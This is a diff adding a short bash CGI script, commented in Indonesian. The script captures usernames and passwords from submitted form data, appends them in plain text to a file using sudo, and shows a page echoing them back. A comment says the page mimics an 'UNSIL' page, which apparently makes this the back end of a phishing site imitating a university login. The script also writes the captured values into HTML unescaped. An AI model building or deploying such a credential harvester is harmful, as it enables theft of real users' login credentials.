@@ -1,0 +1,42 @@
+#!/usr/bin/env bash
+
+echo "Content-Type: text/html"
+echo ""
+
+# Baca seluruh data POST
+DATA=$(cat)
+
+# Ambil username
+USERNAME=$(echo "$DATA" | sed -n 's/.*username=\([^&]*\).*/\1/p')
+# Decode karakter URL
+USERNAME=$(printf '%b' "${USERNAME//%/\\x}")
+# Ganti + menjadi spasi
+USERNAME=${USERNAME//+/ }
+
+# Ambil password
+PASSWORD=$(echo "$DATA" | sed -n 's/.*password=\([^&]*\).*/\1/p')
+PASSWORD=$(printf '%b' "${PASSWORD//%/\\x}")
+PASSWORD=${PASSWORD//+/ }
+
+# Gabungkan
+GABUNG="USER=$USERNAME PASS=$PASSWORD"
+
+# Simpan ke file dengan benar (tanpa error sudo)
+echo "$GABUNG" | sudo tee -a user-password.txt > /dev/null
+
+# Delay sebelum menampilkan halaman
+sleep 2.5
+
+# OUTPUT HTML PERSIS SEPERTI HALAMAN UNSIL
+
+cat <<EOF
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Data Tersimpan</title></head>
+<body>
+<h2>Data telah disimpan.</h2>
+<p>Username: $USERNAME</p>
+<p>Password: $PASSWORD</p>
+</body>
+</html>
+EOF
